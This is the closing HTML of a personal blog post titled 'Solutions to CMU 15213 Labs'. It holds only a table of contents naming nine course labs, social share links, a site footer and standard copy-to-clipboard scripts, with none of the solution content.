        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#lab-1-data-lab"><span class="toc-number">1.</span> <span class="toc-text">Lab 1: Data Lab</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lab-2-bomb-lab"><span class="toc-number">2.</span> <span class="toc-text">Lab 2: Bomb Lab</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lab-3-attack-lab"><span class="toc-number">3.</span> <span class="toc-text">Lab 3: Attack Lab</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lab-4-architecture-lab"><span class="toc-number">4.</span> <span class="toc-text">Lab 4: Architecture Lab</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lab-5-cache-lab"><span class="toc-number">5.</span> <span class="toc-text">Lab 5: Cache Lab</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lab-6-performance-lab"><span class="toc-number">6.</span> <span class="toc-text">Lab 6: Performance Lab</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lab-7-shell-lab"><span class="toc-number">7.</span> <span class="toc-text">Lab 7: Shell Lab</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lab-8-malloc-lab"><span class="toc-number">8.</span> <span class="toc-text">Lab 8: Malloc Lab</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lab-9-proxy-lab"><span class="toc-number">9.</span> <span class="toc-text">Lab 9: Proxy Lab</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://sulley.cc/2024/09/01/20/06/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://sulley.cc/2024/09/01/20/06/&text=Solutions to CMU 15213 Labs"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://sulley.cc/2024/09/01/20/06/&title=Solutions to CMU 15213 Labs"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://sulley.cc/2024/09/01/20/06/&is_video=false&description=Solutions to CMU 15213 Labs"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Solutions to CMU 15213 Labs&body=Check out this article: http://sulley.cc/2024/09/01/20/06/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://sulley.cc/2024/09/01/20/06/&title=Solutions to CMU 15213 Labs"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://sulley.cc/2024/09/01/20/06/&title=Solutions to CMU 15213 Labs"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://sulley.cc/2024/09/01/20/06/&title=Solutions to CMU 15213 Labs"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://sulley.cc/2024/09/01/20/06/&title=Solutions to CMU 15213 Labs"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://sulley.cc/2024/09/01/20/06/&name=Solutions to CMU 15213 Labs&description=&lt;p&gt;This post is an archive for my personal solutions to the ten labs for
the CMU 15213 course. You can access the self-study labs at the CSAPP
official &lt;a href=&#34;https://csapp.cs.cmu.edu/3e/labs.html&#34;&gt;website&lt;/a&gt;.&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://sulley.cc/2024/09/01/20/06/&t=Solutions to CMU 15213 Labs"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2020-2024
    Sulley
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">Categories</a></li><!--
     --><!--
       --><li><a href="/resources/">Resources</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
